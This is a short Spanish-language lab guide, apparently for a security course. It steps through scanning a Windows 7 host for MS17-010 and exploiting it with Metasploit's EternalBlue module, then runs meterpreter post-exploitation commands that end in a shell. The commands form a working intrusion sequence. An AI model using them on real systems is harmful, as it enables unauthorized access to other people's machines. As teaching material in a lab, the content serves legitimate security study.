Explotación de vulnerabilidad utilizando metasploit
===============
Este laboratorio es para fines educativos y su contenido no debe ser utilizado para fines ilícitos  

**Objetivos**
* Experimentar la explotación de una vulnerabilidad 
* Interactuar con la consola de comandos de comandos de metasploit. 
* Interactuar con la consola de comandos de meterpreter.  

**Requisitos**
* Máquina objetivo: Windows 7 64bits  
* Equipo Auditor: Kali Linux 

**Utilizar un scanner para detercar si el equipo es vulnerable a  MS17-010**
* Desde Kali Linux Inicie una sesión de terminal y escriba los siguientes comandos:
```
msfconsole
```
![alt text](./lab01-images/lab01-fig1-msf-console.png "Metasploit framework")

```
Search ms17_10
```
![alt text](./lab01-images/lab01-fig2-msf-console.png "Metasploit framework")
```
use auxiliary/scanner/smb/smb_ms17_010
``` 
```
set RHOSTS “Dirección IP del host windows 7 64bits”
```
```
run
```
![alt text](./lab01-images/lab01-fig3-msf-console.png "Metasploit framework")
**Exploiting**
```
use exploit/windows/smb/ms17_010_eternalblue ```
```
```
show options
``` 
```
set RHOST < Rhost-id > 
```
```
exploit 
```
![alt text](./lab01-images/lab01-fig3-msf-console.png "Metasploit framework")
 
**Post Exploitation**
```bash
Sysinfo
```
![alt text](./lab01-images/lab01-fig5-msf-console.png "Metasploit framework")
```bash
Getuid
```
![alt text](./lab01-images/lab01-fig7-msf-console.png "Metasploit framework")
```Bash
Shell
```
![alt text](./lab01-images/lab01-fig5-msf-console.png "Metasploit framework")

Enlace para mayor información
----- https://www.metasploit.com/
